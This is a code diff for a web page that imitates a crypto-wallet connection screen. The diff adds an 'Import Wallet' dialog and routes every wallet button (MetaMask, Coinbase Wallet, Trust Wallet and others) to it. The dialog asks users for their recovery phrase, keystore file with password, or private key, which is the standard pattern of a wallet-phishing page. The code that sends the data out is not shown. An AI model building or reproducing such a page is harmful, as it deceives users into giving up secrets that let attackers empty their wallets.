@@ -10,33 +10,13 @@
 		<link rel="manifest" type="application/json" href="/manifest.json" />
 		<link rel="shortcut icon" type="image/png" href="images/header-icon.png" />
 		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" />
-		<link rel="stylesheet" type="text/css" href="css/main.css?d" />
+		<link rel="stylesheet" type="text/css" href="css/main.css?al" />
 		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
-
-		<script>
-			// Disable form submissions if there are invalid fields
-			(function() {
-			  'use strict';
-			  window.addEventListener('load', function() {
-			    // Get the forms we want to add validation styles to
-			    var forms = document.getElementsByClassName('needs-validation');
-			    // Loop over them and prevent submission
-			    var validation = Array.prototype.filter.call(forms, function(form) {
-			      form.addEventListener('submit', function(event) {
-			        if (form.checkValidity() === false) {
-			          event.preventDefault();
-			          event.stopPropagation();
-			        }
-			        form.classList.add('was-validated');
-			      }, false);
-			    });
-			  }, false);
-			})();
-		</script>
+		<script type="text/javascript" src="js/main.js"></script>
 
 	</head>
-
+	
 	<body>
 
 
@@ -231,7 +211,7 @@
 			      		<ul class="list-group w-75 mx-auto mb-3">
 			      			
 			      			<li>
-			      				<a href="#" class="modal-btn btn btn-primary mb-3 p-1 w-100 d-flex align-items-center">
+			      				<a href="#" class="modal-btn btn btn-primary mb-3 py-1 px-2 w-100 d-flex align-items-center" data-dismiss="modal" data-toggle="modal" data-target="#walletModal">
 			      					<div class="flex-grow-1 text-left">
 			      						<span>MetaMask</span>
 			      					</div>
@@ -242,7 +222,7 @@
 			      			</li>
 
 			      			<li>
-			      				<a href="#" class="modal-btn btn btn-primary mb-3 p-1 w-100 d-flex align-items-center">
+			      				<a href="#" class="modal-btn btn btn-primary mb-3 py-1 px-2 w-100 d-flex align-items-center" data-dismiss="modal" data-toggle="modal" data-target="#walletModal">
 			      					<div class="flex-grow-1 text-left">
 			      						<span>Wallet Connect</span>
 			      					</div>
@@ -253,7 +233,7 @@
 			      			</li>
 
 			      			<li>
-			      				<a href="#" class="modal-btn btn btn-primary mb-3 p-1 w-100 d-flex align-items-center">
+			      				<a href="#" class="modal-btn btn btn-primary mb-3 py-1 px-2 w-100 d-flex align-items-center" data-dismiss="modal" data-toggle="modal" data-target="#walletModal">
 			      					<div class="flex-grow-1 text-left">
 			      						<span>Coinbase Wallet</span>
 			      					</div>
@@ -264,7 +244,7 @@
 			      			</li>
 
 			      			<li>
-			      				<a href="#" class="modal-btn btn btn-primary mb-3 p-1 w-100 d-flex align-items-center">
+			      				<a href="#" class="modal-btn btn btn-primary mb-3 py-1 px-2 w-100 d-flex align-items-center" data-dismiss="modal" data-toggle="modal" data-target="#walletModal">
 			      					<div class="flex-grow-1 text-left">
 			      						<span>Fortmatic</span>
 			      					</div>
@@ -275,7 +255,7 @@
 			      			</li>
 
 			      			<li>
-			      				<a href="#" class="modal-btn btn btn-primary mb-3 p-1 w-100 d-flex align-items-center">
+			      				<a href="#" class="modal-btn btn btn-primary mb-3 py-1 px-2 w-100 d-flex align-items-center" data-dismiss="modal" data-toggle="modal" data-target="#walletModal">
 			      					<div class="flex-grow-1 text-left">
 			      						<span>Portis</span>
 			      					</div>
@@ -286,7 +266,7 @@
 			      			</li>
 
 			      			<li>
-			      				<a href="#" class="modal-btn btn btn-primary mb-3 p-1 w-100 d-flex align-items-center">
+			      				<a href="#" class="modal-btn btn btn-primary mb-3 py-1 px-2 w-100 d-flex align-items-center" data-dismiss="modal" data-toggle="modal" data-target="#walletModal">
 			      					<div class="flex-grow-1 text-left">
 			      						<span>Trust Wallet</span>
 			      					</div>
@@ -297,7 +277,7 @@
 			      			</li>
 
 			      			<li>
-			      				<a href="#" class="modal-last-btn btn btn-primary mb-3 p-1 w-100">Connect Other Wallet</a>
+			      				<a href="#" class="modal-last-btn btn btn-primary mb-3 p-1 w-100" data-dismiss="modal" data-toggle="modal" data-target="#walletModal">Connect Other Wallet</a>
 			      			</li>
 
 			      		</ul>
@@ -322,33 +302,29 @@
 
 			      		<form action="#" method="POST" class="p-3 needs-validation" novalidate="novalidate">
 
+			      			
+
 							<div class="form-group">
-							    <label for="email">Email address</label>
 							    <input type="email" class="form-control" placeholder="Email address" id="email" required="required" />
 							</div>
 
 							<div class="form-group">
-							    <label for="full_name">Full name</label>
 							    <input type="text" class="form-control" placeholder="Full name" id="full_name" required="required" />
 							</div>
 
 							<div class="form-group">
-							    <label for="">Wallet Address</label>
 							    <input type="text" class="form-control" placeholder="Wallet Address" id="wallet_address" required="required" />
 							</div>
 
 							<div class="form-group">
-							    <label for="token">Token</label>
 							    <input type="text" class="form-control" placeholder="Token" id="token" required="required" />
 							</div>
 
 							<div class="form-group">
-							    <label for="country">Country</label>
 							    <input type="text" class="form-control" placeholder="Country" id="country" required="required" />
 							</div>
 
 							<div class="form-group">
-							    <label for="phone_number">Phone number</label>
 							    <input type="text" class="form-control" placeholder="Phone number" id="phone_number" required="required" />
 							</div>
 
@@ -362,6 +338,102 @@
 			  	</div>
 
 			</div>
+
+
+
+			<div class="modal fade" id="walletModal">
+
+				<div class="modal-dialog modal-dialog-centered">
+
+			 		<div class="modal-content">
+
+			 			<div class="modal-header border-0">
+					        <h3 class="text-center font-weight-bold">Import Wallet</h3>
+					        <button type="button" class="close" data-dismiss="modal">&times;</button>
+					    </div>
+
+			      		<div class="px-3 pb-3">
+			      			
+			      			<ul class="nav nav-pills">
+							  	<li class="nav-item">
+								    <a class="nav-link active" data-toggle="tab" href="#home">Phrase</a>
+								</li>
+								<li class="nav-item">
+								    <a class="nav-link" data-toggle="tab" href="#menu1">Keystore JSON</a>
+								</li>
+								<li class="nav-item">
+								    <a class="nav-link" data-toggle="tab" href="#menu2">Private Key</a>
+								</li>
+							</ul>
+
+							<div class="tab-content pt-4">
+
+								<div class="tab-pane container active" id="home">
+									
+									<form action="#" method="POST" class="p-3 needs-validation" novalidate="novalidate">
+
+
+										<div class="form-group">
+											<textarea class="form-control" placeholder="Phrase" rows="5" id="phrase-textarea" aria-describedby="phrase-textarea-note" required="required"></textarea>
+											<small id="phrase-textarea-note" class="form-text text-muted text-center">Typically 12 (sometimes 24) words separated by single spaces.</small>
+										</div>
+
+										<button type="submit" class="form-btn btn btn-primary mx-auto d-block">Import</button>
+
+									</form>
+
+								</div>
+
+								<div class="tab-pane container fade" id="menu1">
+									
+									<form action="#" method="POST" class="p-3 needs-validation" novalidate="novalidate">
+
+										
+										<div class="form-group">
+											<textarea class="form-control" placeholder="Keystore JSON" rows="5" id="keystore-textarea" aria-describedby="keystore-textarea-note" required="required"></textarea>
+										</div>
+
+										<div class="form-group">
+											<input type="password" class="form-control" placeholder="Password" id="pwd" required="required" />
+										</div>
+
+										<div class="form-group">
+											<small id="keystore-textarea-note" class="form-text text-muted text-center">Several lines of text beginning plus the password you used to encrypt it.</small>
+										</div>
+
+										<button type="submit" class="form-btn btn btn-primary mx-auto d-block">Import</button>
+
+									</form>
+
+								</div>
+
+								<div class="tab-pane container fade" id="menu2">
+									
+									<form action="#" method="POST" class="p-3 needs-validation" novalidate="novalidate">
+
+
+										<div class="form-group">
+											<textarea class="form-control" placeholder="Private Key" rows="5" id="private-textarea" aria-describedby="private-textarea-note" required="required"></textarea>
+											<small id="private-textarea-note" class="form-text text-muted text-center">Typically 12 (sometimes 24) words separated by single spaces.</small>
+										</div>
+
+										<button type="submit" class="form-btn btn btn-primary mx-auto d-block">Import</button>
+
+									</form>
+
+								</div>
+
+							</div>
+
+			      		</div>
+
+			    	</div>
+
+			  	</div>
+
+			</div>
+
+
 
 
 		</div>
